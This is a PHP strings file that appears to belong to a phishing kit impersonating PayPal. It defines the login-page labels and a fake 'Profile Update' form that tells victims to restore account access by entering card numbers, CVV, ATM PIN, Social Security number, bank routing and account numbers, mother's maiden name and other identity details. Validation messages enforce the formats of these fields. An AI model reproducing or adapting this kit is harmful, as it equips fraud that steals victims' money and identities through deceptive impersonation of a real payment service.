<?php

$charset = "UTF-8";
$acctype = "Account type";
$title = "Login - PayPal";
$title2 = "Error - Login - PayPal";
$search1 = "Search PayPal";
$search2 = "Search";
$signup = "Sign Up";
$login = "Log In";
$help = "Help";
$s_center = "Security and Protection";
$s_main = "Skip to main content";
$home = "Home";
$personal = "Personal";
$business = "Business";
$products = "Products & Services";
$develop = "Developers";
$mlogin = "Member Log-In";
$slogin = "Secure Log In";
$alogin = "Account login";
$_email  = "Email address";
$_pass = "PayPal password";
$goto = "Go to";
$macct = "My account";
$m_acctp = "My account - PayPal";
$mtrs = "My transactions";
$paym = "Payment";
$dpaym = "Payment Request";
$p_conx = "Problem with login?";
$forgot = "Forgot your";
$adr = "email adress";
$or = "or";
$epass = "password";
$newtop = "New to PayPal?";
$sup = "Sign up";
$t1 = "More Information";
$t2 = "About Us";
$t3 = "Site Feedback";
$t4 = "Fees";
$t5 = "Privacy";
$t6 = "Security Center";
$t7 = "Contact Us";
$t8 = "Legal Agreements";
$t9 = "Worldwide";
$t10 = "Jobs";
$t11 = "Merchant Services";
$t12 = "Our Blog";
$t13 = "Labs";
$t14 = "Referrals";
$t15 = "Site Map";
$t16 = "eBay";
$t17 = "Community";
$copyright = "Copyright � 1999-2012 PayPal. All rights reserved.";
$fdic = "Information about FDIC pass-through insurance";
$processing = "Logging in...";
$opay = "Logging in - PayPal";
$safe = "PayPal. The safer, easier way to pay.";
$ifno = "If this page appears for more than 5 seconds,";
$clickhere = "click here";
$reload = "to reload.";
$profupdate = "Profile Update - PayPal";
$logout = "Log Out";
$myacc = "My Account";
$over = "Overview";
$addfound = "Add Funds";
$retirar = "Withdraw";
$banktf = "Transfer to Bank Account";
$history = "History";
$bsearch = "Basic Search";
$dhistory = "Download History";
$demendcheq = "Request a check";
$usedebit = "Use a debit card";
$resolu = "Resolution Centre";
$opencase = "View Open Cases";
$guides = "Guides";
$prof = "Profile";
$est_acc = "Establish an account";
$addemail = "Add or Edit Email";
$addbank = "Add or Edit Bank Account";
$ver = "Verified";
$upacc = "Upgrade the account";
$editacc = "Edit Account";
$cardpay = "PayPal Plus Credit Card";
$paymobile = "Use PayPal on your mobile phone";
$news = "News";
$activity = "Review Recent Activities";
$surepay = "Pay Is Sure And More Faster With PayPal";
$know = "Know Where Using PayPal";
$valid = "You have successfully activated your PayPal account.";
$redirect = "You will be redirected to the login page. Please login again.";
$addfunbank = "Add funds from a bank account";
$gsales = "Sale Manager";
$addfundmoney = "Add funds from MoneyPak account";
$addcard = "Add or Edit Credit Card";
$addadr = "Add or Edit Postal Address";
$addphone = "Add or Edit a phone number";
$moreopt = "More options";
$sendmoney = "Send Money";
$reqmoney = "Request Money";
$mservices = "Merchant Services";
$autools = "Auction Tools";
$stra = "Secure Transaction";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">Please complete the form below to update your Profile information and restore your account access.</p></div></div>';
$pip = "Personal Information Profile";
$accu = "Make sure you enter the information accurately, and according to the formats required.";
$filla = "Fill in all the required fields.";
$filds="Required fields";

$month = "Month";
$day = "Day"; 
$year = "Year";
$hpn = "Home Phone Number :";
$acpnum = "This number will be used to contact you about Security Measures and/or other issues regarding your PayPal account.";
$hap = "Home Address Profile";
$acu = "Enter your information as accurately as possible.";
$adr1 = "Address Line 1 :";
$adr2 = "Address Line 2 :";
$city = "City :";
$state = "State :";
$zip = "Zip Code :";
$country = "Country :";
$scountry = "--Select Country--";
$ccprof = "Credit/Debit Card Profile";
$damelacc = "Enter card information as accurately as possible.";
$damelacb = "For card number, enter numbers only please, no dashes or spaces.";
$cvv = "Card Verification Number :";
$hcvv = "Help finding your Card Verification Number";
$rfield = "Required Field";
$for1 = "For your protection, we verify credit card information.";
$for2 = "The process normally takes about 30 seconds, but it may take longer during certain times of the day. Please click";
$for3 = "to update your information.";
$spo = "Save Profile";
$puf = "Profile Update";
$assl = "About SSL Certificates";
$logo = "https://securepics.ebaystatic.com/aw/pics/paypal/site/us/imgUSHoliday09Wk10_560x228.jpg";


$Nomdelabanque = "Bank Name";
$Ndecompte = "Account number";
$Nomdutitulairedelacarte = "Name of cardholder :";

$Tcard = "Card Type :";
$ccnumbr = "Card Number :";
$expbr = "Expiration Date :";
$atmm = "Your ATM PIN :";

$quis1 = "Mother's maiden name";
$quis2 = "Last 4 characters of driver's license";
$quis3 = "Last 4 digits of social security number";
$quis4 = "City of birth";
$quis5 = "Another question";

$ffPrenom = "First name :";
$ffNom = "Last name :";

$IDTYPE = "Select type of Id :";
$Passport="Passport";
$Card_Identification="Card of Identification";
$Driving_License="Driving License";

$codepersonel="Secure code :";

$dateness = "Date of Birth :";
$ssn = "Social Security Number :";
$quest0 = "Security Question :";
$choosquest1 = "--Choose a Question--";

$choosquest2 = "Another question :";

$quest2 = "2nd Security Question :";
$answer = "Answer :";
$troubl = "Troubleshooting Tips";
$forg = "Forgot your password?";
$caract = "- Your password is at least eight (8) characters long.";
$majuscl = "- Your password is case-sensitive, make sure your Caps Lock is off.";
$forgmail = "Forgot your email address?";
$identify = "- Identify the email address you used to register for PayPal.";
$newemail = "New email address?";
$logusing = "- Log in using your old email address and go to your Profile to update your address.";
$troubl = "Trouble logging in?";
$ymst = "- You might have tried too many times. Try again in 2 hours, or ";
$cntus = "contact us";
$needhlp = ", if you need more help.";
$encookies = "- You might need to enable cookies in your web browser.";
$howork = "How PayPal Works";
$whatis = "What is PayPal";
$started = "Getting Started";
$managacc = "Managing Your Account";
$greatw = "Great Ways to Use PayPal";
$topten = "Top Ten Things to Know About PayPal";
$howmuch = "How Much It Costs";
$acctyp = "Account Types";
$payon = "Pay Online";
$greatd = "Great Deals";
$pstory = "PayPal Store Directory";
$pmaster = "PayPal Plus MasterCard";
$shopvm = "Shop Via Mobile";
$smoney = "Send Money";
$smoneyon = "Send Money Online";
$internly = "Internationally";
$tyt = "To Your Teen";
$vmobile = "Via Your Mobile";
$gpaid = "Get Paid";
$sonln = "Sell Online";
$accard = "Accept Credit Cards";
$rqmoney = "Request Money";
$fundrs = "Fundraise";
$activ_recent = "My recent activity";
$p_received = "Payments received";
$p_envoye = "Payments sent";
$aff_trans = "View all of my transactions";
$sept_j = "Last 7 days";
$what = "What's this";
$gloss = "Payment status glossary";
$when = "When an icon appears next to one of your transactions, it means there is more information available or a note attached. Move your cursor over the icon to learn more about the transaction.";
$select_recent = "S�lectionner toutes les transactions r�centes";
$date = "Date";
$type = "Type";
$n_email = "Name/Email";
$etat_pay = "Payment status";
$details = "Details";
$etat_commande = "Order status/Actions";
$a_commission = "Gross";
$aucun_objet = "-No New Items-";
$notif = "Notifications";
$mise_a_jour = "Policy Updates";
$whatsThis = "Transactions you Archive will be moved to your All Activity list.";

$routing="Bank Routing Number :";
$account="Bank Account Number :";
$accountch="Last 4 digits of Account(Checking) :";
$hrouting="Help finding your Bank Routing Number";
$haccount="Help finding your Bank Account Number";

$font1 = "<font color='#c00'>";
$font2 = "</font>";



$valid = array("Please enter your first name"
,"The maximum for the name is 40"
,"Please enter your name"
,"The maximum for the name is 40"
,"Choose * month * Date of Birth"
,"Please select * Day * Date of Birth"
,"Please select * Year * Date of Birth"
,"Please enter your address"
,"Maximum for the address is 50"
,"Minimum for the address is 5"
,"Please enter the name of your city"
,"Maximum for the name of your city is 15"
,"Minimum for the name of your city is 4"
,"Select Country / Territory"
,"Please enter your ZIP code"
,"Minimum number for the ZIP code is 5"
,"Please enter your Telephone staff"
,"Enter only the number"
,"Minimum for the phone number is 10"
,"Please enter name of cardholder"
,"Please Select * Card Type *"
,"Please enter your card number"
,"The Maximum for the card number is 16"
,"The Minimum for the card number is 13"
,"Enter only the number"
,"Please select the Expiration Date - Month -"
,"Please select the Expiration Date - Year -"
,"Please enter your CVV"
,"Enter CVV only the number"
,"The Minimum for CVV number is 3"
,"Please enter your ATM Code"
,"Maximum number for the ATM Code is 4"
,"Minimum number for the ATM Code is 4"
,"Please enter your Social Security Number"
,"Maximum number for the Social Security Number is 9"
,"Minimum number for the Social Security Number is 9"
,"The Social Security Number only the number");

$error0 = "<div id=\"messageBox\" class=\"legacyErrors\"><div class=\"messageBox error\"><p>Some required information is missing or incomplete. Please correct your entries and try again.</p></div></div>";
$error1 = "<div id=\"messageBox\" class=\"legacyErrors\"><div class=\"messageBox error\"><p>Please make sure you enter your <b>email address</b> and <b>password correctly</b>. If you still can't log in, please see the <b>Troubleshooting Tips</b> below.</p></div></div>";
                             

?>
